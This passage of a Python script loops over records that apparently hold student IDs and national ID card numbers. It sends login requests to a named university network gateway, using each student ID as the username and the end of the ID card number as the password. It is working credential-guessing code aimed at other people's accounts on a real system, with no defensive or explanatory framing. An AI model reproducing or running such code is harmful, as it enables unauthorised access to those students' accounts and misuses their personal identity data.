...
for e in j['data']:
    if int(e['id'])>20152009:
        c=Post("http://ipgw.neu.edu.cn:804/srun_portal_phone.php?ac_id=1&","action=login&ac_id=1&user_ip=&nas_ip=&user_mac=&url=&username="+e['id']+"&password="+e['idcard'][12:]+"&save_me=0")
